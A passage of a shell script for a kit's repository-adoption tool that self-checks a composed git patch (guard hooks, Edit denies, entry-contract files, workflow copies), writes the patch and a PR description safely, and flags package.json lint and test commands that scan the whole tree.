  gg init -q "$T/chk" || die1 "git init failed in the check directory; nothing was written"
  gg -C "$T/chk" apply --whitespace=nowarn --check "$T/patch" || die1 "git apply --check refused the patch just composed; nothing was written"
  gg -C "$T/chk" apply --whitespace=nowarn "$T/patch" || die1 "git apply failed on the copy; nothing was written"
  _cs="$T/chk/.claude/settings.json"
  [ -f "$_cs" ] || die1 "the applied copy has no .claude/settings.json; nothing was written"
  _o=$(sh "$ROOT/conformance/guard-wired.sh" --rung1-only "$T/chk" 2>&1) && _rc=0 || _rc=$?
  [ "$_rc" -eq 0 ] || { printf '%s\n' "$_o" >&2; die1 "guard-wired.sh --rung1-only refused the applied copy; nothing was written"; }
  _wn=$(printf '%s\n' "$_o" | grep -c '^WARN:' || true)   # MUT-IGNWARN
  [ "$_wn" -eq 0 ] || { printf '%s\n' "$_o" >&2; die1 "guard-wired.sh warns on the applied copy (on a non-kit tree a wrong guard command is only a WARN, which counts as a failure here); nothing was written"; }
  denies_ok "$_cs" || die1 "the applied copy lacks one of the three Edit denies (--rung1-only does not check them); nothing was written"   # MUT-NODENY
  jqw -e "$JQ_DEFS"'[.hooks.PreToolUse[]?.hooks[]? | select(isg) | .command] | (length > 0) and all(. == $c)' "$_cs" >/dev/null 2>&1 \
    || die1 "a guard hook command in the applied copy is not the canonical command; nothing was written"
  jqw -n -e --slurpfile a "$T/old.json" --slurpfile b "$_cs" "$JQ_DEFS $STRIP" >/dev/null 2>&1 \
    || die1 "the applied settings differ from yours by more than the named additions; nothing was written"
  verify_entry
  if [ "$GUARD_ONLY" -eq 0 ]; then verify_stamped; fi
}
leg_run() {  # <label> <command...>: the kit's own judge on the applied copy; its first lines go to stderr when it refuses
  _lb=$1; shift
  _lo=$(cd "$T/chk" && "$@" 2>&1) && _lr=0 || _lr=$?   # every judge runs with the applied copy as its cwd, so a relative read (a dispositions file, a CLAUDE.md) is the adopter's, never the caller's
  if [ "$_lr" -eq 0 ]; then printf '%s\n' "self-check: $_lb passed"; return 0; fi
  printf '%s\n' "adopt: $_lb refused the applied copy; nothing was written; its first lines:" >&2
  printf '%s\n' "$_lo" | head -n 8 | while IFS= read -r _ln; do printf '  | %s\n' "$(safe "$_ln")" >&2; done
  exit 1
}
BP_SKIP_LINE="owed: the adopter fills the Backlog backend line; branch-protection --declared-only judges it at their first PR"
bp_leg() {  # branch-protection.sh --declared-only on the applied tree, never on a modified copy. A declared tracker-board-gates is judged always-green until the adopter fills
  # CLAUDE.md's Backlog backend line (a header field a person fills), so under --backlog jira (the only backend that declares it) the leg is skipped, said so in the output, and named owed in the summary.
  if [ -n "$R_TBG" ]; then   # MUT-BPSKIP
    printf '%s\n' "self-check: conformance/branch-protection.sh --declared-only skipped. $BP_SKIP_LINE"
    return 0
  fi
  leg_run "conformance/branch-protection.sh --declared-only" sh "$ROOT/conformance/branch-protection.sh" --declared-only "$T/chk/REQUIRED-CHECKS.md"
}
verify_stamped() {  # the stamped areas, on $T/chk: the kit's judges, then byte-for-byte copies (no verify-enforced-wired leg: it takes no root argument, erratum E2)
  for _w in $A_K; do
    cmp -s "$ROOT/profiles/$_w.yml" "$T/chk/.github/workflows/$_w.yml" || die1 "the applied $_w.yml is not the kit's profile byte for byte; nothing was written"
  done
  if [ "$A_W" -eq 1 ]; then
    cmp -s "$ROOT/templates/WAIVER-REGISTER.md" "$T/chk/WAIVER-REGISTER.md" || die1 "the applied WAIVER-REGISTER.md is not the kit's template byte for byte; nothing was written"
  fi
  if [ "$A_C" -eq 1 ]; then leg_run "conformance/ci-gates.sh --own-tree" sh "$ROOT/conformance/ci-gates.sh" --own-tree "$T/chk"; fi
  if [ "$A_T" -eq 1 ]; then leg_run "scripts/tracker-conf.sh" sh "$ROOT/scripts/tracker-conf.sh" "$T/chk/.kit/tracker.conf"; fi
  if [ "$A_R" -eq 1 ] && [ "$CI" = github ]; then bp_leg; fi
}
# agents-brief.sh takes no root argument and runs three legs from its working directory; only the middle one grades the patch (errata E1)
ec_leg() {  # <agents-brief output> -> the lines between its two header lines; rc 1 when either header is missing (fail closed if the script's output changes)
  [ "$(printf '%s\n' "$1" | grep -c '^Entry-contract lock')" = 1 ] || return 1
  [ "$(printf '%s\n' "$1" | grep -c '^Operator card pin')" = 1 ] || return 1
  printf '%s\n' "$1" | awk '/^Entry-contract lock/{on = 1; next} /^Operator card pin/{exit} on'
}
ec_graded() {  # <leg text>: rc 0 iff it holds no FAIL or UNVERIFIED line and at least one PASS line
  [ "$(printf '%s\n' "$1" | grep -Ec '^(FAIL|UNVERIFIED):' || true)" = 0 ] || return 1   # MUT-ECFAIL
  [ "$(printf '%s\n' "$1" | grep -c '^PASS:' || true)" -ge 1 ]
}
ec_lock_run() {  # <dir>: the kit's adapter manifests go into <dir>, agents-brief.sh runs there; _ecl = its entry-contract leg; rc 0 iff that leg grades clean
  for _m in "$ROOT"/adapters/*/adapter.json; do
    [ -f "$_m" ] || continue
    _md="$1/adapters/$(basename "$(dirname "$_m")")"; mkdir -p "$_md"; cp "$_m" "$_md/adapter.json"
  done
  _ab=$(cd "$1" && sh "$ROOT/conformance/agents-brief.sh" 2>&1) || true
  _ecl=$(ec_leg "$_ab") || _ecl=""
  ec_graded "$_ecl"
}
ec_leg_show() {  # the leg's lines to stderr, each through safe()
  if [ -n "$_ecl" ]; then printf '%s\n' "$_ecl" | while IFS= read -r _ln; do printf '%s\n' "$(safe "$_ln")" >&2; done; else echo "adopt: the entry-contract section was not found in agents-brief.sh's output" >&2; fi
}
as_is_lock() {  # nothing to patch: the target's CLAUDE.md and AGENTS.md as they stand must pass the lock leg, or "current" would be a claim nobody graded
  mkdir -p "$T/asis"
  for _f in $EC_FILES; do
    [ -f "$T/base/$_f" ] || die2 "$_f is missing where the patch should have added it; run again"
    cp "$T/base/$_f" "$T/asis/$_f"
  done
  ec_lock_run "$T/asis" || { ec_leg_show; die2 "agents-brief.sh's entry-contract check refuses your CLAUDE.md or AGENTS.md as they stand (see the lines above); fix what it names, then rerun"; }
}
verify_entry() {  # the lock's entry-contract leg on the applied copy, then the byte check the lock cannot make (it compares members with each other)
  ec_lock_run "$T/chk" || { ec_leg_show; die1 "conformance/agents-brief.sh's entry-contract check refused the applied copy; nothing was written"; }
  region_of "$TPL" > "$T/kit.region"
  for _f in $EC_FILES; do
    region_of "$T/chk/$_f" > "$T/chk.sec"
    cmp -s "$T/kit.region" "$T/chk.sec" || die1 "the applied $_f does not open with the kit's entry contract byte for byte (the lock only compares the files with each other); nothing was written"   # MUT-REGBYTES
  done
}

write_out() {
  :   # MUT-WRITEDIRECT
  # one open, no-clobber, mode 600: the file is created and written through the same descriptor, so nothing can be swapped in between
  ( umask 077; set -C; exec 3> "$OUTREAL" || exit 3; cat "$T/patch" >&3 || exit 4 ) 2>/dev/null && _wr=0 || _wr=$?
  [ "$_wr" -eq 0 ] && return 0
  if [ "$_wr" -eq 4 ]; then rm -f "$OUTREAL"; die1 "could not write the patch to --out; the partial file was removed"; fi
  die2 "could not create --out without overwriting (it appeared meanwhile, or is not writable); nothing was written"
}
# --- the PR body (SWAS-1010 PR 4, design 3 and errata Q2): a description for the adoption PR, beside the patch; no heredoc, one printf per paragraph ---
BODY_N=0
has_wf() { [ -f "$T/w/.github/workflows/$1" ]; }   # MUT-HOLDS
body_line() { printf '%s\n' "$1" >> "$T/pr.md"; }
body_check() {  # <workflow file> <check> <what it shows>: one line, only when the applied tree holds that workflow file (the table is the design's section 3; the release manifest names files, not check contexts)
  has_wf "$1" || return 0
  BODY_N=$((BODY_N + 1))
  body_line "- \`$2\`: $3"
}
body_checks() {
  body_line "## What the checks on this PR will show"
  body_line ""
  body_line 'This is the adoption PR. The branch it targets has no kit yet, so some checks have nothing to judge from. Read each line below before you read a red or a missing check as a fault (docs/adoption/brownfield.md, "Your first PR"). Open this PR against your default branch: the test that recognises an adoption PR needs that.'
  body_line ""
  body_check ratification.yml control-plane-ratification 'green, with a notice SKIPPED (adoption PR). The base commit carries no kit, so there is no trusted gate to judge from. Your own review and merge of this PR is the approval.'
  body_check adopter-gates.yml backlog-presence 'green, with a notice SKIPPED (adoption PR), for the same reason.'
  body_check adopter-gates.yml loop-state 'green, with a notice PASS (Inception exemption). The gate still runs and its verdict is printed for information.'
  body_check adopter-gates.yml ceremony-binding 'green, with a notice PASS (Inception exemption). The gate still runs and its verdict is printed for information.'
  body_check adopter-gates.yml review-lane 'expected green, with its own N/A notice when the base has no review grader. Read its log if it is not.'
  body_check adopter-tracker-gates.yml tracker-board-gates 'never posts on this PR. It runs from the base branch, and the base branch has no such file. This is expected, not a failure.'
  body_check solo-go.yml solo-go-bound 'never posts on this PR, for the same reason. This is expected, not a failure.'   # MUT-SOLOLINE
  body_check ci.yml ci 'gives its real verdict, as on any PR. Fix what it names.'
  if [ "$BODY_N" -eq 0 ]; then body_line 'This patch adds no CI workflow, so it adds no kit check to this PR.'; fi
  body_line ""
}
body_merge() {
  body_line "## Merging it"
  body_line ""
  if [ "$TEAM" != solo ]; then
    body_line 'Merge it with the review your repository requires. Where the repository cannot enforce branch protection (a private repository on GitHub Free), merge it once, by hand, after you have read the diff (docs/adoption/vc-hosts.md, "Declaring solo, in order").'
    body_line ""
    return 0
  fi
  body_line 'Your repository is declared solo, so the kit asks for one hand merge (docs/adoption/vc-hosts.md, "Declaring solo, in order"):'
  body_line ""
  body_line '1. This PR carries `.kit/dials.conf` with the line `MERGE_RELATIONSHIP=solo`. If the diff does not hold it, create it on this PR.'
  body_line '2. Run `sh scripts/promotion-verify.sh record` on the head sha of this PR: class `control-plane`, your own words in `--token`, your name in `--go-by`.'
  body_line '3. Merge this PR yourself, by hand. No `--admin` is needed on a free private repository. From then on the agent merges on your recorded GO.'
  body_line ""
}
body_dispositions() {
  has_wf ci.yml || return 0
  body_line "## If you drop a step from your ci.yml"
  body_line ""
  body_line '`conformance/gate-dispositions.txt` needs an `na` line, with a reason, for each `gate-*` step you drop from `.github/workflows/ci.yml`, or `ci-gates-own` goes red. A line is the gate id, a tab, `na`, a tab and the reason. When this patch adds that file, it holds the lines for the steps `adopt` dropped from the ci.yml it fitted; a step you drop afterwards is yours to record. Writing that file is your own act, in your own editor.'
  body_line ""
}
compose_body() {  # the body, from the work copy $T/w (the applied tree): written to $T/pr.md and written out by write_body once the patch is
  : > "$T/pr.md"; BODY_N=0
  body_line "# Adopt the Sparkwright kit"
  body_line ""
  body_line 'This description was written by `sparkwright adopt` beside the patch. Read the summary at the top of the patch before you merge: it lists every area the patch adds, keeps or leaves to you.'
  body_line ""
  body_checks
  body_merge
  body_dispositions
}
write_body() {  # after the patch is written (and was self-checked): same rules as the patch; a body that cannot be written removes the patch (errata R2-N6)
  ( umask 077; set -C; exec 3> "$PRB" || exit 3; cat "$T/pr.md" >&3 || exit 4 ) 2>/dev/null && _wr=0 || _wr=$?   # FAULT-BODYWRITE
  [ "$_wr" -eq 0 ] && return 0
  [ "$_wr" -ne 4 ] || rm -f "$PRB"
  rm -f "$OUTREAL"   # MUT-KEEPPATCH
  die1 "could not write the PR body beside --out; the patch was removed, so nothing is left behind"
}

# --- the area records and the one composer (erratum E5): every area, note and next step is a record in $T/rec; render_summary <form> prints them for the patch top or the terminal ---
rec() { printf '%s\t%s\n' "$1" "$2" >> "$T/rec"; }   # <tag> <text>: a tab-free text
rec_each() { awk -F '\t' -v t="$1" '$1 == t { print $2 }' "$T/rec"; }
rec_guard() {  # the guard and entry areas (today's report lines), as records
  case "$SET_STATE" in
    new) rec guard ".claude/settings.json: new file holding the guard hook and the three Edit denies" ;;
    changed) rec guard ".claude/settings.json: your document plus the guard hook and any missing Edit denies; every other key and hook is kept" ;;
  esac
  for _g in $GUARD_WRITE; do rec guard ".claude/hooks/$_g: the kit's copy, mode 755, sha256 $(sha256 "$ROOT/.claude/hooks/$_g")"; done
  [ -z "$GI_MISSING" ] || rec guard ".gitignore: appends a comment line, then $(printf '%s' "$GI_MISSING" | tr '\n' ' ')"
  for _f in $EC_WRITE; do
    case "$(cat "$T/ec/$_f.kind")" in
      new) rec entry "$_f: new file holding the kit's entry contract" ;;
      insert) rec entry "$_f: the kit's entry contract goes in at the top, after a leading title line; your content follows it" ;;
      replace) rec entry "$_f: everything from your old entry-contract heading up to the next '## ' heading is replaced by the kit's; the lines above it and from that next heading on are unchanged" ;;
      close) rec entry "$_f: the kit's closing heading is added after your entry contract, which is already the kit's" ;;
    esac
  done
  [ -z "$EC_WRITE" ] || rec owed "owed to you, never filled by the patch: the project header fields **Project:**, **Intent owner:**, the backlog backend and the target harnesses (docs/adoption/brownfield.md, section 3)"
  [ "$REFORMAT" -eq 0 ] || rec note "note: your settings.json was not in two-space layout, so the patch also reformats the whole file"
  if [ "$SET_STATE" != none ]; then
    _en=""
    if jq -e 'has("env")' "$T/old.json" >/dev/null 2>&1; then _en=", including its env values"; fi
    rec termonly "This patch contains your settings.json and its values$_en. Read it yourself; an agent should not read it."
  fi
}
sum_line() {  # <form> <tag> <text>: one line of an area, in the patch form (hash-led, tagged) or the terminal form (indented)
  if [ "$1" != patch ]; then printf '  %s\n' "$3"; return 0; fi
  if [ -z "$2" ]; then printf "#   %s\n" "$3"; else printf "# [%s] %s\n" "$2" "$3"; fi   # MUT-SUMLEAD
}
render_notes() {  # <form>: the NOTES (proposals only), the owed lines and the notes
  if [ "$1" = patch ]; then
    printf '%s\n' "#" "# NOTES (proposals only; nothing below is in the patch)"
    for _nt in nline lint owed note; do rec_each "$_nt" | while IFS= read -r _l; do printf '#   %s\n' "$_l"; done; done
    return 0
  fi
  for _nt in owed note; do rec_each "$_nt" | while IFS= read -r _l; do printf '  %s\n' "$_l"; done; done
  if [ -n "$(rec_each nline)$(rec_each lint)" ]; then
    printf '%s\n' "NOTES (proposals only; nothing in them is in the patch)"
    for _nt in nline lint; do rec_each "$_nt" | while IFS= read -r _l; do printf '  %s\n' "$_l"; done; done
  fi
  rec_each termonly
}
render_summary() {  # <form> patch|terminal: the by-area lines, the NOTES and the "Next, you:" steps, from one set of records
  _f=$1; _p=""
  if [ "$_f" = patch ]; then
    _p="# "
    printf '%s\n' "# sparkwright adopt $KIT_VER proposed changes for $NAME (stack $STACK, backlog $BACKLOG, team $TEAM)" "# Read every area. Applying this patch with git apply is how you accept it." "#"
  fi
  for _t in guard entry checks waivers tracker workflows ci ci-n dispositions disp-n owners solo skipped kept; do
    rec_each "$_t" | while IFS= read -r _l; do
      case "$_t" in
        ci-n|disp-n) sum_line "$_f" "" "$_l" ;;
        *) sum_line "$_f" "$_t" "$_l" ;;
      esac
    done
  done
  render_notes "$_f"
  if [ "$_f" = patch ]; then printf '%s\n' "#"; fi
  printf '%s\n' "${_p}Next, you:" "${_p}  1. Read the patch." "${_p}  2. At the repository root: git apply '$OUTREAL'" "${_p}  3. sh conformance/guard-wired.sh" \
    "${_p}  4. Install the pre-push hook yourself (docs/adoption/brownfield.md, section 2 step 5); it stays a human act." \
    "${_p}  5. Open the adoption PR against your default branch, with the text in '$OUTREAL.pr.md' as its description: it explains each check you will see (docs/adoption/brownfield.md, \"Your first PR\")."   # MUT-NEXTPR
}
report() {
  printf '%s\n' "Patch written: $OUTREAL"
  render_summary terminal
}

# --- the lint and test command detector (SWAS-1011, design 6): it reads the target's package.json and .kit-manifest as text, never runs or edits either, and adds records of kind "lint" ---
LINT_TAB=$(printf '\t')
lint_cs() { printf '%s' "$1" | LC_ALL=C grep -Eq "$2"; }   # <value> <ERE>: rc 0 iff the whole value passes its charset
lint_unq() {  # <word>: one layer of matching ' or " removed -> _uw
  _uw=$1
  case "$_uw" in
    \"*\"|\'*\') _uw=${_uw#?}; _uw=${_uw%?} ;;
  esac
}
lint_isassign() {  # <word>: a leading NAME=value word
  case "$1" in
    [A-Za-z_]*=*) return 0 ;;
  esac
  return 1
}
lint_whole() {  # <operand>: a whole-tree operand (rule A): ., ./, or a glob that starts ** or ./**
  case "$1" in
    .|./|'**'*|'./**'*) return 0 ;;
  esac
  return 1
}
lint_walker() {  # <label>: rule B's closed list, the tools that read the whole current directory when given no operand
  case "$1" in
    xo|eslint|standard|vitest|jest|"node --test") return 0 ;;
  esac
  return 1
}
lint_valued() {  # <tool> <flag>: a flag of the closed per-tool list that takes a value when given without =
  case "$1" in
    node) _lvl=" --import --require -r --loader --experimental-loader --test-reporter --test-reporter-destination --test-name-pattern --test-skip-pattern --test-concurrency --test-timeout " ;;
    eslint) _lvl=" -c --config --ext -f --format -o --output-file --ignore-path --ignore-pattern --rule --plugin --max-warnings --cache-location " ;;
    xo) _lvl=" --extend --env --global --ignore --plugin --parser --reporter --cwd --space " ;;
    jest) _lvl=" -c --config --testPathPattern -t --testNamePattern --coverageDirectory " ;;
    vitest) _lvl=" -c --config --root --dir -t --testNamePattern --reporter " ;;
    *) return 1 ;;
  esac
  case "$_lvl" in
    *" $2 "*) return 0 ;;
  esac
  return 1
}
lint_operand() {  # <word>: counts an operand; vitest's first word run, watch or dev is a subcommand
  if [ "$_lsub" -eq 1 ]; then
    _lsub=0
    case "$1" in
      run|watch|dev) return 0 ;;
    esac
  fi
  _lo=$((_lo + 1))
  if [ -z "$_lw" ] && lint_whole "$1"; then _lw=$1; fi
}
lint_args() {  # <tool> <words...> -> _lt the tool, _lo the operand count, _lw the first whole-tree operand, _ln 1 for node's --test
  _lt=$1; shift
  _lo=0; _lw=""; _ln=0; _lskip=0; _lsub=0
  if [ "$_lt" = vitest ]; then _lsub=1; fi
  for _la in "$@"; do
    lint_unq "$_la"; _la=$_uw
    if [ "$_lskip" -eq 1 ]; then _lskip=0; continue; fi
    case "$_la" in
      --test)
        if [ "$_lt" = node ]; then _ln=1; fi ;;
      -*)
        if lint_valued "$_lt" "$_la"; then _lskip=1; fi ;;
      *)
        lint_operand "$_la" ;;
    esac
  done
}
lint_runner_ok() {  # <node|js>: rc 0 iff .kit-manifest names a file that runner finds by default (design 6.3, E4's Node set; js adds *.spec.* and __tests__/)
  awk -v mode="$1" '
    { n = split($0, a, "/"); b = a[n]
      if (b !~ /\.(js|mjs|cjs|ts|mts|cts)$/) next
      s = b; sub(/\.(js|mjs|cjs|ts|mts|cts)$/, "", s)
      if (s ~ /\.test$/ || s ~ /-test$/ || s ~ /_test$/ || s ~ /^test-/ || s == "test") hit = 1
      for (i = 1; i < n; i++) if (a[i] == "test") hit = 1
      if (mode == "js") { if (s ~ /\.spec$/) hit = 1; for (i = 1; i < n; i++) if (a[i] == "__tests__") hit = 1 }
    }
    END { exit !hit }' "$T/lint.man"
}
lint_emit() {  # <key> <label> <reason>: one finding line, and the label once in the tools file
  _ek=$1
  if ! lint_cs "$_ek" '^[A-Za-z0-9:_-]{1,40}$'; then _ek='<a script>'; fi   # MUT-RAWKEY
  printf '%s\n' "  scripts.$_ek: $2 $3" >> "$T/lint.find"
  if ! grep -qxF -- "$2" "$T/lint.tools"; then printf '%s\n' "$2" >> "$T/lint.tools"; fi
}
lint_decide() {  # the segment's tool _lt, operands _lo, whole-tree operand _lw and node's --test _ln: rule A or B, then the test-runner condition, then the finding
  _lb=$_lt
  if [ "$_lt" = node ]; then
    [ "$_ln" -eq 1 ] || return 0
    _lb="node --test"
  fi
  if [ -n "$_lw" ]; then _rk=A   # MUT-NOGLOBRULE
  elif [ "$_lo" -eq 0 ] && lint_walker "$_lb"; then _rk=B   # MUT-OPERANDBLIND
  else return 0
  fi
  case "$_lb" in
    "node --test") _rm=node ;;
    vitest|jest) _rm=js ;;
    *) _rm="" ;;
  esac
  if [ -n "$_rm" ] && ! lint_runner_ok "$_rm"; then return 0; fi   # MUT-RUNNERALWAYS
  if [ "$_rk" = B ]; then
    _rs="has no path, so it reads every file under the root"
    if [ "$_lb" = "node --test" ]; then _rs="has no file, so it runs every test file under the root"; fi
  else
    if ! lint_cs "$_lt" '^[A-Za-z0-9._@/-]{1,40}$'; then _lb="this command"; fi
    _ow=$_lw
    if ! lint_cs "$_ow" '^[A-Za-z0-9._*/{},-]{1,64}$'; then _ow="a whole-tree glob"; fi
    _rs="is given \"$_ow\", which covers the whole tree"
  fi
  lint_emit "$_lsk" "$_lb" "$_rs"
}
lint_segment() {  # <key> <segment>: leading NAME=value words, one npx / env / cross-env, then the tool and its words
  _lsk=$1
  # shellcheck disable=SC2086
  set -f; set -- $2; set +f   # the segment is split into words on purpose, with globbing off
  while [ $# -gt 0 ] && lint_isassign "$1"; do shift; done
  case "${1:-}" in
    npx)
      shift
      case "${1:-}" in
        -y|--yes) shift ;;
      esac ;;
    env|cross-env)
      shift
      while [ $# -gt 0 ] && lint_isassign "$1"; do shift; done ;;
  esac
  [ $# -gt 0 ] || return 0
  lint_unq "$1"; _tw=${_uw#./node_modules/.bin/}; shift
  lint_args "$_tw" "$@"
  lint_decide
}
lint_value() {  # <key> <value>: split at && || ; | and a lone &, each segment judged on its own
  printf '%s\n' "$2" | tr '&|;' '\n\n\n' > "$T/lint.seg"
  while IFS= read -r _lsg; do
    lint_segment "$1" "$_lsg"
  done < "$T/lint.seg"
}
lint_scripts() {  # the in-scope script keys (lint, test, lint:*, test:*) and their string values, control bytes replaced, into $T/lint.find via lint_value
  jq -r 'def clean($r): explode | map(if . < 32 or . == 127 then $r else . end) | implode;
    (try (.scripts // {}) catch {}) | if type == "object" then to_entries[]
      | select(.value | type == "string")
      | select(.key == "lint" or .key == "test" or (.key | startswith("lint:")) or (.key | startswith("test:")))
      | "\(.key | clean(63))\t\(.value | .[0:2000] | clean(32))" else empty end' "$T/lint.pkg" > "$T/lint.kv" 2>/dev/null || : > "$T/lint.kv"
  while IFS=$LINT_TAB read -r _lk _lv; do
    lint_value "$_lk" "$_lv"
  done < "$T/lint.kv"
}
lint_folders() {  # _lfl = the top-level folders of .kit-manifest that hold no tracked file of the adopter's and are directories of the kit running adopt, C order, charset-checked (no leading dot), space-joined
  gitx -c core.quotepath=false -C "$TROOT" ls-files > "$T/lint.trk" 2>/dev/null || : > "$T/lint.trk"
  # a ls-files line that starts with a quote is a name git quoted (it holds a quote, a backslash or a control byte): its first component, cut at / or \ or ", holds an adopter file
  LINT_MF="$T/lint.man" awk '
    BEGIN { mf = ENVIRON["LINT_MF"] }
    FILENAME == mf { m[$0] = 1; i = index($0, "/"); if (i > 0) top[substr($0, 1, i - 1)] = 1; next }
    substr($0, 1, 1) == "\"" { q = substr($0, 2); for (k = 1; k <= length(q); k++) { c = substr(q, k, 1); if (c == "/" || c == "\\" || c == "\"") break }; if (k > 1) bad[substr(q, 1, k - 1)] = 1; next }
    !($0 in m) { j = index($0, "/"); if (j > 0) bad[substr($0, 1, j - 1)] = 1 }   # MUT-ALLDIRS
    END { for (d in top) if (!(d in bad)) print d }' "$T/lint.man" "$T/lint.trk" | LC_ALL=C sort | LC_ALL=C grep -E '^[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}$' > "$T/lint.cand" || : > "$T/lint.cand"
  _lfl=""
  while IFS= read -r _lfd; do
    if [ -d "$ROOT/$_lfd" ]; then _lfl="$_lfl $_lfd"; fi   # MUT-KITDIR
  done < "$T/lint.cand"
  _lfl=${_lfl# }
}
lint_ex() {  # <prefix> <suffix> -> _lx: "<p>folder<s>", ... from the first two folders, or just ... when there are none
  _lx=""; _lxn=0
  for _lxd in $_lfl; do
    [ "$_lxn" -lt 2 ] || break
    if [ -n "$_lx" ]; then _lx="$_lx, "; fi
    _lx="$_lx\"$1$_lxd$2\""
    _lxn=$((_lxn + 1))
  done
  if [ -z "$_lx" ]; then _lx="..."; else _lx="$_lx, ..."; fi
}
lint_hint() {  # <label> -> _lh: the one fixed hint line of that tool
  case "$1" in
    xo) lint_ex "" "/**"; _lh="xo: in package.json, add \"xo\": {\"ignores\": [$_lx]} with each folder above" ;;
    eslint) lint_ex "" "/"; _lh="eslint: add {ignores: [$_lx]} as the first entry of eslint.config.js, with each folder above" ;;
    standard) lint_ex "" "/"; _lh="standard: in package.json, add \"standard\": {\"ignore\": [$_lx]} with each folder above" ;;
    "node --test") _lh='node --test: name your own test files or folders, for example node --test "test/**/*.test.js"' ;;
    vitest) _lh="vitest: add each folder above to test.exclude in your vitest config, beside configDefaults.exclude (skip this if test.include names only your folders)" ;;
    jest) lint_ex "<rootDir>/" "/"; _lh="jest: in package.json, add \"jest\": {\"testPathIgnorePatterns\": [\"/node_modules/\", $_lx]} with each folder above (skip this if roots or testMatch name only your folders)" ;;
    *) _lh="$1: point it at your own folders, or add each folder above to its ignore list" ;;
  esac
}
lint_flush() {  # the findings, the folder line, the hint heading and one hint per tool that fired, as records; nothing when no segment fired
  [ -s "$T/lint.find" ] || return 0
  rec lint "Lint and test commands that read the whole tree (they now read the kit's files too; this patch does not change package.json):"
  _lfc=0
  while IFS= read -r _lfd; do
    _lfc=$((_lfc + 1))
    if [ "$_lfc" -le 20 ]; then rec lint "$_lfd"; fi   # MUT-CAP
  done < "$T/lint.find"
  if [ "$_lfc" -gt 20 ]; then rec lint "... and $((_lfc - 20)) more"; fi
  if [ -n "$_lfl" ]; then
    rec lint "Folders that hold only the kit's files: $_lfl"
  else
    rec lint "No top-level folder holds only the kit's files; the kit's paths are listed in .kit-manifest."
  fi
  rec lint "To keep the kit's folders out, for example:"
  while IFS= read -r _lht; do lint_hint "$_lht"; rec lint "  $_lh"; done < "$T/lint.tools"
}
lint_detect() {  # design 6.1: only with a package.json and a .kit-manifest at the target root; a package.json that is not strict JSON gets the one not-read line
  [ -f "$TROOT/package.json" ] && [ ! -L "$TROOT/package.json" ] || return 0
  [ -f "$TROOT/.kit-manifest" ] && [ ! -L "$TROOT/.kit-manifest" ] || return 0   # MUT-NOMANIFESTGATE
  cp "$TROOT/package.json" "$T/lint.pkg" 2>/dev/null || { rec lint "[lint] not read: package.json could not be read"; return 0; }
  cp "$TROOT/.kit-manifest" "$T/lint.man" 2>/dev/null || : > "$T/lint.man"
  : > "$T/lint.find"; : > "$T/lint.tools"
  if ! json_strict_ok "$T/lint.pkg"; then
    rec lint "[lint] not read: package.json is not strict JSON"
    return 0
  fi
  lint_scripts
  lint_folders
  lint_flush
}

# --- the brownfield areas (SWAS-1009, design 4): each only when absent, never a merge; the stamping goes through the kit's own scripts/stamp-lib.sh ---
load_lib() {
  [ -f "$ROOT/scripts/stamp-lib.sh" ] || die2 "a broken kit distribution: scripts/stamp-lib.sh is missing; use a complete kit export or checkout, then rerun"
  STAMP_CALLER=adopt   # the library's mktemp-failure message names its caller
  # shellcheck source=stamp-lib.sh
  . "$ROOT/scripts/stamp-lib.sh"
}
need_kit_file() { [ -f "$ROOT/$1" ] || die2 "the kit's $1 is missing; use a complete kit export or checkout, then rerun"; }
bad_value() {  # <flag> <value> <ERE>: refuse (exit 2) a control byte, or a value that fails its pattern
  case "$2" in
    *[[:cntrl:]]*) die2 "$1 must not hold a control character" ;;
  esac
  printf '%s' "$2" | grep -Eq "$3" || die2 "$1 '$(safe "$2")' does not match the pattern $3"
}
validate_flags() {  # every value checked at flag parse, before any work; --guard-only needs none of them
  [ "$GUARD_ONLY" -eq 0 ] || return 0
  case "$TEAM" in
    solo|team) : ;;
    '') die2 "say --team solo or --team team (solo lets branch protection run at zero approvals with the solo GO check standing in, so the kit will not choose it for you), or pass --guard-only for the guard and entry-contract patch alone" ;;   # MUT-TEAMDEFAULT
    *) die2 "--team takes solo or team, or pass --guard-only for the guard and entry-contract patch alone" ;;
  esac
  _bl=" md github jira ado linear gitlab "
  case "$_bl" in
    *" $BACKLOG "*) : ;;
    *) die2 "--backlog '$(safe "$BACKLOG")' is not one of md github jira ado linear gitlab" ;;
  esac
  if [ "$EXISTING" -eq 1 ] && [ "$BACKLOG" != jira ]; then die2 "--existing is for --backlog jira only"; fi
  case "$CI" in
    ''|github|gitlab) : ;;
    *) die2 "--ci takes github or gitlab" ;;
  esac
  case "$OWNER" in
    *[[:cntrl:]]*) die2 "--owner must not hold a control character" ;;
  esac
  if [ -n "$NAME" ]; then bad_value --name "$NAME" '^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$'; fi
  if [ -n "$TURL" ]; then bad_value --tracker-url "$TURL" '^https://[a-z0-9.-]+(:[0-9]{1,5})?$'; fi
  if [ -n "$TPROJ" ]; then bad_value --tracker-project "$TPROJ" '^[A-Z][A-Z0-9_]{0,9}$'; fi
}
pick_stack_ci_name() {  # needs the target: the stack, the CI host and the name, each defaulted from it or refused
  [ "$GUARD_ONLY" -eq 0 ] || return 0
  if [ -z "$CI" ]; then
    if [ -e "$TROOT/.gitlab-ci.yml" ]; then die2 "the target holds a .gitlab-ci.yml; say --ci gitlab (areas workflows, CI, dispositions and code owners are then not proposed) or --ci github"; fi
    CI=github
  fi
  if [ -z "$STACK" ]; then
    if [ -f "$TROOT/package.json" ]; then STACK=typescript-node; else die2 "no package.json at the target root, so the stack is unknown; say --stack <name> (a profiles/<name>/ directory of this kit)"; fi
  fi
  case "$STACK" in
    ''|*[!a-z0-9-]*) die2 "--stack must be a profile name (lowercase letters, digits and -)" ;;
  esac
  [ -d "$ROOT/profiles/$STACK" ] || die2 "--stack '$STACK' is not a profiles/ directory of this kit"
  if [ -z "$NAME" ]; then NAME=$(basename "$TROOT"); fi
  bad_value --name "$NAME" '^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$'
}
set_paths() {  # a full run adds the brownfield areas to every path list
  [ "$GUARD_ONLY" -eq 0 ] || return 0
  PATHS="$PATHS $PATHS_N"
  NEW_FILES="$PATHS_N $READ_PATHS"; NEW_DIRS=".github .github/workflows .kit conformance docs"
  SNAP_PATHS="$PATHS $READ_PATHS"
  KIT_VER=$(head -n 1 "$ROOT/VERSION" 2>/dev/null | tr -cd 'A-Za-z0-9._-') || KIT_VER=""
  [ -n "$KIT_VER" ] || KIT_VER=unknown
  DATE=$(date -u +%Y-%m-%d)
